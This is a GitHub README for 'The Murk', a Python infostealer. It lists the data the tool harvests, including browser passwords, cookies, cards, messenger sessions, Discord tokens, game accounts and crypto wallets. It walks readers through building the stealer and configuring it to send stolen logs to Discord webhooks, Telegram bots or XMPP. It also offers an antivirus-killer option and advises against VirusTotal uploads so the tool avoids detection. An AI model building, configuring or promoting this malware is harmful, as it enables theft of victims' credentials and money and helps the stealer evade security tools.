<a id ="up"></a>
![LOGO](Images/pxfulllogo.png)
<img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue">
<img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
<img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/The%20Murk-v8.0.1-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">


🔐open source turbo🚀 stealer written on Python, all logs will be sent using discord webhooks, telegram bot or XMPP bot.
[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v8.1.0)

⭐Please, star this repo if it was helpful⭐

***
### ⛔Disclaimer⛔

I, the creator, am __NOT__ responsible for any actions, and or damages, caused by this software. You __BEAR__ the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's main purpose is __NOT__ to be used maliciously, or on any system that you do not own, or have the right to use. __By using this software, you automatically agree to the above.__

---
### ❗❗Request❗❗

__Don't upload builded stealer to Virustotal__. The more often you upload it, the more and faster antiviruses begin to recognize its signature.

---
### ❕❕Data grubed❕❕
* ✅System info
    * ⌚Time
    * 💻OS
    * 💻HWID
    * 🔩CPU
        * 📜Cores
        * 📜CPU frequency
    * 📡IP
    * 📡Location
    * 💽RAM
        * 💾Available
        * 💾Used
    * 📜PC name
    * 💽Discs
        * 📜volumes
        * 💾All Memory
        * 💾Available
        * 💾Used
        * 📜File system type
    * 🧪Antiviruses
    * 🎥GPU
        * 🔩Type
        * 💾All memory in the GPU
        * 💾Free memory in the GPU
        * 📜Graphics card temperature
    * 📠Processes
* ✅Files .txt and .docx
    * 📝in Desktop
    * 📝in Documents
    * 📝in Downloads
* 🪁Messagers
   * 📢Telegram sessions
   * 📢Viber sessions
   * 📢Discord sessions + token-grabber
   * 📢Skype sessions
   * 📢WhatsApp sessions
   * 📢And more
* ⚔Game
   * ♠Steam
   * ♠Epic Games
   * ♠Uplay
   * ♠Roblox
   * ♠Minecraft
   * ♠And more
* 💳Wallets
   * 💵PayPal
   * 💵Kivi
   * 📈Binance
   * 📈Metamask
   * 📈Atomic
   * 💵And more
* ✅Browsers
    * 🔗Chrome
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 💳Cards
    * 🔗Firefox
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 💳Cards
    * 🔗Opera
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 💳Cards
    * 🔗Edge
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 💳Cards
    * 🔗Brave
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 💳Cards
    * 🔗And more
* ✅Other
    * 📸Sreenshot
    * 📸Camera photo
* ✅File grabber
* ✅Secure to use
---
### 🔨Building(using builder)

### 🎮For Discord
__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v8.1.0). 
After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
Finally, insert the name and webhook link in the builder. And wait, secure building will take about 2 minutes.__

### 📨For Telegram
So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. Then, you need to save token and bot name. 
Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
Insert this data in builder console. And wait, secure building will take about 2 minutes.

---

### 🔨Building(manually)

### 🎮For Discord
Finally, insert the name and webhook link in the `TheMurk.py` here
```
enableFileGrubber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avKiller = False #enable antiviruses killer
sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
discordData = ["url of your WebHook","name of that WebHook"]
```
and run `Compile.bat`

### 📨For Telegram
Finally, insert the name and webhook link in the `TheMurk.py` here
```
enableFileGrubber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avKiller = False #enable antiviruses killer
sendType = 1 # 0 via Discord; 1 via Telegram; 2 via XMPP
TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
```
and run `Compile.bat`

### 📡For XMPP
Finally, insert the name and webhook link in the `TheMurk.py` here
```
enableFileGrubber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avKiller = False #enable antiviruses killer
sendType = 2 # 0 via Discord; 1 via Telegram; 2 via XMPP
xmppData = ["jabberid","jabberpassword","jabberreceiver"]
```
and run `Compile.bat`

---
### ❌Builder errors

If you have error like this:

![error](Images/error.png)

How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal-external-command/)

If you have error like this:

![error](Images/error1.png)

input in cmd `pip uninstall typing` and than input `y`


---
### 🧾Results(logs)
Example of message in Discord

![LOGO](Images/example1.png)

![LOGO](Images/example.png)

---
### 💰 Donate
   <a href="https://www.donationalerts.com/r/nick_vinesmoke"><img src="https://img.shields.io/badge/Donationalerts-F37623?style=for-the-badge&logo=Cash%20App&logoColor=white"></a>
   <a href="https://patreon.com/NickVinesmoke"><img src="https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white"></a>
   
   BTS <code>bc1qfe46xsewu00yhl0llzaxhz9re03y4al0w9p3v2</code>
  
  ETH <code>0xeeA063838950D191881EdF0E31b4699B73aD20Ac</code>
  
  XMR: <code>83PXY1A4PvPWCwveY4cN5p5zFLKNF4KMGfzRnR4A8qPXRABzoHPoahUP4H6eP636FPYbkn76tzUJmcc2Lai3VFkLHdoe4QV</code>

---
### 📲Contacts
open [issues](https://github.com/Nick-Vinesmoke/The-Murk-stealer/issues), [pull requests](https://github.com/Nick-Vinesmoke/The-Murk-stealer/pulls) or [discussions](https://github.com/Nick-Vinesmoke/The-Murk-stealer/discussions)

or 

<a href="https://github.com/Nick-Vinesmoke"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a>
   <a href="https://discordapp.com/users/798503509522645012/"><img src="https://img.shields.io/badge/Discord-003E54?style=for-the-badge&logo=Discord&logoColor=white"></a>
---
[go up](#up)
